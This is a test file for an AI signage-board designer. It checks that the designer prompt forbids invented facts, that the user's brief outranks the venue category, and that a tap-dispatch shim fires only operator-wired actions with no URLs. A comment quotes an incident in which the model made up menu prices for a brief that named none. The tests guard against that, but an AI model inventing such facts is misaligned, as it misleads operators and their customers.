    const base = summarizeHouseStyle([board(''), board('')])!;
    const withRefines = summarizeHouseStyleWithRefines(
      [board(''), board('')],
      ['bigger text please', 'too small to read', 'less clutter', 'too busy'],
    )!;
    // At most 2 short preference lines appended — not unbounded growth.
    expect(withRefines.length).toBeLessThan(base.length + 250);
  });
});

// ── GROUND-TRUTH LAW + brief-beats-vertical precedence (2026-08-25 incident) ──
describe('GROUND-TRUTH LAW in the designer prompt', () => {
  it('states the no-invented-fact law BEFORE the typography mandate', () => {
    expect(DESIGNER_SYSTEM_PROMPT).toContain('GROUND-TRUTH LAW');
    expect(DESIGNER_SYSTEM_PROMPT).toContain('NEVER INVENT A FACT');
    expect(DESIGNER_SYSTEM_PROMPT.indexOf('GROUND-TRUTH LAW')).toBeLessThan(
      DESIGNER_SYSTEM_PROMPT.indexOf('TYPOGRAPHY IS PRIORITY ONE'),
    );
  });

  it('no longer asks the model to invent items or offers', () => {
    // The literal instruction that produced "Burger $2.99 / Fries $3.00 /
    // DEAL - 2 for $6 - All Day" on a brief that named no prices.
    expect(DESIGNER_SYSTEM_PROMPT).not.toContain('believable items/offers');
    expect(DESIGNER_SYSTEM_PROMPT).not.toContain('invent sensible REAL-sounding content');
  });

  it('tells the model what to do when the facts are missing (drop / empty state)', () => {
    expect(DESIGNER_SYSTEM_PROMPT).toContain('WHEN THE FACTS ARE MISSING, THE SECTION DOES NOT EXIST');
    expect(DESIGNER_SYSTEM_PROMPT).toContain('Add your items and prices');
  });

  it('labels the exemplar prices as brief-supplied, not a pattern to copy', () => {
    expect(DESIGNER_SYSTEM_PROMPT).toContain('COPY THE CRAFT, NEVER THE CONTENT');
  });
});

describe('brief beats vertical (precedence)', () => {
  it('opens the user prompt with an explicit precedence order', () => {
    const p = buildDesignerUserPrompt({ prompt: 'welcome board', width: 1920, height: 1080, vertical: 'qsr' });
    expect(p.startsWith('PRECEDENCE')).toBe(true);
    expect(p).toContain('never overrides what they DID say');
  });

  it('demotes the vertical line to a hint, not an instruction', () => {
    const p = buildDesignerUserPrompt({ prompt: 'welcome board', width: 1920, height: 1080, vertical: 'qsr' });
    expect(p).toContain("Vertical: qsr (the venue's default category");
    expect(p).toContain('the brief above outranks it');
  });

  it('says the CONFIRMED BRIEF outranks the vertical', () => {
    const out = formatBriefForPrompt({
      occasion: 'welcome',
      headline: 'Welcome to Riverside',
      items: [],
      dateTime: '',
      tone: '',
      callToAction: '',
    });
    expect(out).toContain("OUTRANKS the venue's vertical");
    expect(out).toContain('GROUND-TRUTH LAW');
  });
});

// ── TAP TARGETS: the runtime emit must never silently disappear ────────────
//
// THE TRAP THIS GUARDS. The designer shim's header says it is "sourced VERBATIM
// from apps/web/scripts/inject-shim-v2.cjs (MARKER EDUCMS-SHIM-V6) so there is
// ONE runtime" — and that injector has ZERO `educms-action` emits. So the next
// agent who "re-syncs the one runtime", or who runs that injector over a board
// carrying this shim, would strip the tap dispatch and leave every AI-designed
// hot zone ARMED BUT DEAD: it looks like a button, it does nothing on tap, and
// nothing anywhere goes red. That is the exact silent-failure family the
// 2026-08-25 incident was about, so it gets a test instead of a comment.
describe('EDUCMS-SHIM-V6 — runtime tap dispatch', () => {
  it('emits educms-action so an AI-designed hot zone can actually fire', () => {
    expect(DESIGNER_EDIT_SHIM).toContain("type:'educms-action'");
  });

  it('reads the operator’s wired action map off the overrides message', () => {
    // WidgetRenderer.postDesignerOverrides already posts `actions`; before
    // 2026-08-25 this shim ignored it, so it never knew what was wired.
    expect(DESIGNER_EDIT_SHIM).toContain('applyActions(d.actions)');
  });

  it('never fires for a key the operator has not wired', () => {
    // The player also re-resolves the key against its own copy (W0-02), but the
    // board must not post a phantom tap either.
    expect(DESIGNER_EDIT_SHIM).toContain('var action=WIRED[key];');
  });

  it('gives an UNWIRED hot zone no tap affordance (never looks interactive while inert)', () => {
    expect(DESIGNER_EDIT_SHIM).toContain("el.style.cursor=on?'pointer':''");
  });

  it('never fires in edit mode (there a click configures the action instead)', () => {
    expect(DESIGNER_EDIT_SHIM).toContain('function onActionTap(e){try{if(editMode)return;');
  });

  it('never lets the BOARD choose a destination — it only names a key', () => {
    // The AI is structurally incapable of supplying a URL: it emits
    // data-action="<key>" and the player resolves the destination from the
    // operator's own saved wiring. Nothing here may invent an href.
    const body = DESIGNER_EDIT_SHIM.slice(DESIGNER_EDIT_SHIM.indexOf('function onActionTap'));
    const emit = body.slice(0, body.indexOf('document.addEventListener'));
    expect(emit).not.toMatch(/https?:\/\//);
    expect(emit).not.toContain('location.href');
  });
});
